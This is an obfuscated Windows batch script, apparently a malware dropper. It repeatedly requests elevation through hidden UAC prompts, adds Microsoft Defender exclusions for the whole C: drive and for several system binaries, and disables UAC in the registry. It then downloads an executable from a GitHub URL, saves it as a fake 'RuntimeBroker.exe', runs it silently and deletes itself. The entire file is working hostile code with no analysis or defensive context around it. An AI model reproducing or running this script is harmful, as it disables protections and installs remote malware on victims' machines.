@echo off & setlocal enableDelayedExpansion
set "oLx=>nul" & set "Gra=SESSION" & set "zUhPE=NET" & set "TAwn=2>&1"
%zUhPE% %Gra% %oLx% %TAwn%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "hLIYt=baz" & set "tJK=bar" & set "CMiaf=qux" & set "EHi=foo" & rem CoP euoybw VdZRhbA
set "JiAJ=powershell -ExecutionPolicy Bypass -Command"
set "OyJ=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "abkb='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "bOK='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!JiAJ! "!OyJ! !abkb! !bOK!" %oLx% %TAwn%
set "cZQZk=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "jqD=-Name 'EnableLUA' -Value 0"
!JiAJ! "!cZQZk! !jqD!" %oLx% %TAwn%
set "KDC=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!JiAJ! "!KDC!" %oLx% %TAwn%
if !errorlevel! neq 0 (goto %a%)
set "Aiz=timeout /t" & !Aiz! 2 %oLx% %TAwn%
set "PkBnT=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "tnA=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "BKWb=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!JiAJ! "!PkBnT! !tnA! !BKWb!" %oLx% %TAwn%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!Aiz! 1 %oLx% %TAwn% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %oLx% %TAwn%
del /f /q "%~f0" %oLx% %TAwn%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %oLx% %TAwn%
if !errorlevel! neq 0 (!Aiz! 3 %oLx% %TAwn% & goto %b%)
exit /b
